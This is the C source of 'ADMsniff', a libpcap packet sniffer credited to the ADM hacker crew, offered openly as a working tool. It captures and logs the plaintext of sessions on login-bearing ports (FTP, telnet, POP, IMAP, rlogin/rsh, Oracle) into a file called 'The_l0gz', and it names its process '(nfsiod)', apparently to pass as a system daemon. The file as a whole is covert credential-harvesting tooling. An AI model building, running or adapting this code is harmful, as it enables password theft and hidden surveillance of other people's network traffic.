/***************************************************************************
                      ___      ______      _       _
                    /     \   |   _   \   |  \   /  |
                   |  / \  |  |  |  \  |  |   \_/   |
                   | |___| |  |  |_ /  |  |   \_/   |
..oO  THE          |  ---  |  |       /   |  |   |  |         CreW Oo..
                   '''   '''   '''''''    ''''   ''''        
                               presents

*****************************************************************************/

/*****************************************************************/
/*  ADM sniffer  (c) ADM                                         */
/* USE THIS VERSION !!!!! */

#define VERSION "priv 1.0"
#define ETHHDEFAULT 14

#define N0L0G 0x3

#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <memory.h>
#include <stdlib.h>
#include <sys/types.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#ifdef COMPRESS
#include <zlib.h>
#include <signal.h>
#endif


#include "pcap.h"
#include "ip.h"
#include "tcp.h"

#define IPHDRSIZE  sizeof(struct iphdr)
#define TCPHDRSIZE sizeof(struct tcphdr)

#define ERROR -1
#define IPPROTO_TCP 6
#define PROGNAME "(nfsiod)"

char LOGPATH[] = "./";
u_short BOOG = 0;
u_short ETHHDRSIZE;
u_char *buf;
u_short coolport[] =
{21, 23, 109, 110, 143, 512, 513, 514, 1521, 31337};


u_short len = 0;
u_short LOG = 0;

short sport = 0;
short dport = 0;

#ifndef COMPRESS
FILE *filez;
#else
gzFile filez;
#endif


static char logname[255];
static char tmp[255];
static char sip[255];
static char dip[255];

char *whynot;
char *data;
struct tcphdr *tcp;
struct iphdr *ip;

struct pcap_pkthdr h;
struct pcap *pcap_d;

struct the_ip
  {
    u_long sip;
    u_long dip;
    u_short sport;
    u_short dport;
    u_long time;
    char data[4012];
    int size;
    char flags;
  };

struct the_ip *theipz[4012];
int howmanyip = 0;


#ifdef COMPRESS

void hup_handler(int sig)
{
	gzflush(filez,Z_FULL_FLUSH);
	fprintf(stderr,"COUCOU");
	/* for linux */
	signal(SIGHUP,hup_handler);
}

void term_handler(int sig)
{
	fprintf(stderr,"\nTerminating.\n");
	gzclose(filez);
	exit(1);
}
	
#endif


char *
myinet_ntoa (u_long theipofthedeath)
{
  struct in_addr in;
  in.s_addr = theipofthedeath;
  return (inet_ntoa (in));
}

void 
goodstr (char *src, char *dst, int size)
{
  int i;
  for (i = 0; i < size; i++)

    if (isprint (src[i]))
      dst[i] = src[i];
    else if (dst[i] == '\r' || dst[i] == '\n')
      dst[i] = '\n';
    else
      dst[i] = '.';
}

int
flushstruct (int i, char add)
{
  if (add != 1)
    if (theipz[i]->flags != N0L0G)
      if ((theipz[i]->time + 7000) > time (NULL))
	if (strlen (theipz[i]->data) > 4011)
	  {
#ifndef COMPRESS
      		  fprintf (filez, "\n--=[ %s:%i --> ", myinet_ntoa (theipz[i]->sip), ntohs (theipz[i]->sport));
              fprintf (filez, "%s:%i ]=--\n", myinet_ntoa (theipz[i]->dip), ntohs(theipz[i]->dport));
                  fwrite (theipz[i]->data, strlen (theipz[i]->data), 1, filez);
		  fflush(filez);
#else
		  gzprintf(filez, "\n--=[ %s:%i --> ", myinet_ntoa (theipz[i]->sip), ntohs (theipz[i]->sport));
	    	gzprintf (filez, "%s:%i ]=--\n", myinet_ntoa (theipz[i]->dip), ntohs (theipz[i]->dport));
	    gzwrite (filez,theipz[i]->data, strlen (theipz[i]->data));
#endif
	    theipz[i]->flags = N0L0G;
	    return (0);
	  }

  if ((theipz[i]->time + 7000) < time (NULL) || add == 1)
    {
      if (theipz[i]->flags != N0L0G)
	{

#ifndef COMPRESS
	  fprintf (filez, "\n--=[ %s:%i --> ", myinet_ntoa (theipz[i]->sip), ntohs (theipz[i]->sport));
	  fprintf (filez, "%s:%i ]=--\n", myinet_ntoa (theipz[i]->dip), ntohs (theipz[i]->dport));
	  fwrite (theipz[i]->data, strlen (theipz[i]->data), 1, filez);
	  fprintf (filez, ".\n");
	  fflush(filez);
#else
          gzprintf (filez, "\n--=[ %s:%i --> ", myinet_ntoa (theipz[i]->sip), ntohs (theipz[i]->sport));
	  gzprintf (filez, "%s:%i ]=--\n", myinet_ntoa (theipz[i]->dip), ntohs (theipz[i]->dport));
          gzwrite (filez,theipz[i]->data, strlen (theipz[i]->data));
          gzprintf (filez, ".\n");
#endif
	  
	  theipz[i]->flags = N0L0G;
	}
      free (theipz[i]);
      theipz[i] = NULL;
      return (0);
    }
  return (0);
}

void
dumpstruct ()
{
  int i;
  for (i = 0; i < 4012; i++)
    if (theipz[i] != NULL)
      {
	printf ("DUMP STRUCT = NUMBER %i\n", i);
	printf ("*sip -> %s*\n", myinet_ntoa (theipz[i]->sip));
	printf ("*sport -> %i*\n", htons (theipz[i]->sport));
	printf ("*dip -> %s*\n", myinet_ntoa (theipz[i]->dip));
	printf ("*dport -> %i*\n", htons (theipz[i]->dport));
	printf ("*data -> %s\n", theipz[i]->data);
	printf ("*---------*\n");
      }
  printf ("\\*       The END            */\n");

}

int
newstruct (u_long sip, u_long dip, u_short sport, u_short dport)
{
  int i = -1;

 /*  Debug only   dumpstruct (); */
 
  for (i = 0; i < 4012; i++)
    if (theipz[i] != NULL)
      {
	if (sip == theipz[i]->sip)
	  if (dip == theipz[i]->dip)
	    if (sport == theipz[i]->sport)
	      if (dport == theipz[i]->dport)
		return (i);
      }
  for (i = 0; i < 4012; i++)
    if (theipz[i] == NULL)
      {
	theipz[i] = calloc (1, sizeof (struct the_ip));
	theipz[i]->sip = sip;
	theipz[i]->dip = dip;
	theipz[i]->sport = sport;
	theipz[i]->dport = dport;
	theipz[i]->time = time (NULL);
	theipz[i]->size = 0;
	memset (theipz[i]->data, 0, 4012);
	return (i);
      }

  return (-1);
}


int
Log ()
{
  int i;
  char buffer[8012];
  LOG = 0;
  ip = (struct iphdr *) (buf + ETHHDRSIZE);
  tcp = (struct tcphdr *) (buf + IPHDRSIZE + ETHHDRSIZE);



  for (i = 0; i < sizeof (logname); i++)
    logname[i] = 0;

  for (i = 0; i < sizeof (tmp); i++)
    tmp[i] = 0;


  for (i = 0; i < sizeof (sip); i++)
    sip[i] = 0;

  for (i = 0; i < sizeof (dip); i++)
    dip[i] = 0;



  switch (ip->protocol)
    {

    case IPPROTO_TCP:
      if ((h.len - (ETHHDRSIZE + IPHDRSIZE)) < TCPHDRSIZE)
	break;

      for (i = 0; coolport[i] != 31337; i++)
	{
	  if (coolport[i] == ntohs (tcp->th_sport) ||
	      coolport[i] == ntohs (tcp->th_dport))
	    LOG = 1;
	}




      if (LOG != 1)
	return (1);

      sport = ntohs (tcp->th_sport);
      dport = ntohs (tcp->th_dport);

      if ((i = newstruct (ip->saddr, ip->daddr, tcp->th_sport, tcp->th_dport)) == -1)
	return (0);


      data = (char *) (buf + IPHDRSIZE + TCPHDRSIZE + ETHHDRSIZE);
      len = (h.len) - (IPHDRSIZE + TCPHDRSIZE + ETHHDRSIZE);
      memset (buffer, 0, sizeof (buffer));
      goodstr (data, buffer, len);
      strncat (theipz[i]->data, buffer, (4010 - strlen (theipz[i]->data)));

      if ((tcp->th_flags & TH_RST) || (tcp->th_flags & TH_FIN))
	flushstruct (i, 1);
      else
	flushstruct (i, 0);

#ifndef COMPRESS
      fflush (filez);
#endif
      break;
    }

  return (1);
}



int
main (argc, argv)
     int argc;
     char **argv;
{
  char ebuf[255];
  int i;
  if (argc < 2)
    {
      printf ("ADMsniff %s <device> [HEADERSIZE] [DEBUG] \n", VERSION);
      printf ("ex   : admsniff le0\n");
      printf (" ..ooOO The ADM Crew OOoo.. \n");
      exit (ERROR);
    }

  for (i = 0; i < 4012; i++)
    theipz[i] = NULL;


  pcap_d = pcap_open_live (argv[1], 8024, 1, 1000, ebuf);
  if (pcap_d == NULL)
    {
      printf ("cant open pcap device :<\n");
      return (-1);
    }
  switch (pcap_datalink (pcap_d))
    {
    case DLT_NULL:
      ETHHDRSIZE = 4;
      break;
    case DLT_EN10MB:
    case DLT_EN3MB:
      ETHHDRSIZE = 14;
      break;
    case DLT_PPP:
      ETHHDRSIZE = 4;
      break;
    case DLT_SLIP:
      ETHHDRSIZE = 16;
      break;
    case DLT_FDDI:
      ETHHDRSIZE = 21;
      break;
    case DLT_RAW:
      ETHHDRSIZE = 0;
      break;
    default:
      fprintf (stderr, "init_pcap : Unknown device type!\n");
      return (-1);
    }

  printf ("ADMsniff %s  in libpcap we trust !\n", VERSION);
  printf ("credits: ADM, mel , ^pretty^ for the mail she sent me\n");
#ifdef COMPRESS
  printf ("You compiled ADMsniff with compression support, don't\n");
  printf ("forget about the log flushing tricks (see README).\n\n");
#endif


#ifndef COMPRESS
  filez = fopen ("The_l0gz", "w");
#else
  signal(SIGHUP,hup_handler);
  signal(SIGTERM,term_handler);
  filez = gzopen("The_l0gz","wb");
#endif

  while (1)
    {
      buf = (u_char *) pcap_next (pcap_d, &h);
      fflush (stdout);
      if ((h.len - ETHHDRSIZE) >= IPHDRSIZE && buf != NULL)
	Log ();
    }

  return (0);
}
